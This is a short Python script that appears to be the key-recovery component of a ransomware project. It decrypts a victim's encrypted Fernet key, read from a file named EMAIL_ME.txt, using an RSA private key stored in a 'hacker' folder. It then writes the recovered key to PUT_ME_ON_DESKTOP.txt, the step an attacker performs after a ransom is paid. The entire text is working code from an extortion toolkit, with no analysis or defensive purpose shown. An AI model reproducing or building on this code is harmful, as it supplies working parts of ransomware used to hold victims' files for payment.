from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os

sys_root = os.path.expanduser('~')
fernet_loc = sys_root + '\\Desktop\\localRoot\\EMAIL_ME.txt'


def decrypt_fernet_key():
    with open(fernet_loc, 'rb') as f:
        fernet_key = f.read()

    with open(f'{sys_root}\\Desktop\\localRoot\\PUT_ME_ON_DESKTOP.txt', 'wb') as f:
        public_key = RSA.importKey(open(f'{sys_root}\\Desktop\\hacker\\private.pem').read())
        public_crypter = PKCS1_OAEP.new(public_key)
        dec_fernet_key = public_crypter.decrypt(fernet_key)
        f.write(dec_fernet_key)
